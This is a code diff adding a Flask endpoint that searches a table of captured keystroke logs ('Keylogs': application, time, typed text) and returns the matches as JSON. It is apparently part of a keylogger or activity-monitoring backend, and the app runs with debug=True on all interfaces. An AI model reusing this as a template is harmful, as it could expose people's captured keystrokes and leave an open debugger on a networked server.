@@ -131,5 +131,26 @@ def search():
             conn.close()
     return jsonify({'error': 'Database connection failed'}), 500
 
+
+@app.route('/search_keylogs', methods=['POST'])
+def search_keylogs():
+    search_term = request.form.get('search_term')
+    if not search_term:
+        return jsonify([])
+
+    conn = get_db_connection()
+    if conn:
+        try:
+            results = conn.execute('''
+                SELECT application, time, text
+                FROM Keylogs 
+                WHERE application LIKE ? OR text LIKE ?
+                ORDER BY time DESC LIMIT 50
+            ''', (f'%{search_term}%', f'%{search_term}%')).fetchall()
+            return jsonify([dict(row) for row in results])
+        finally:
+            conn.close()
+    return jsonify({'error': 'Database connection failed'}), 500
+
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=True)
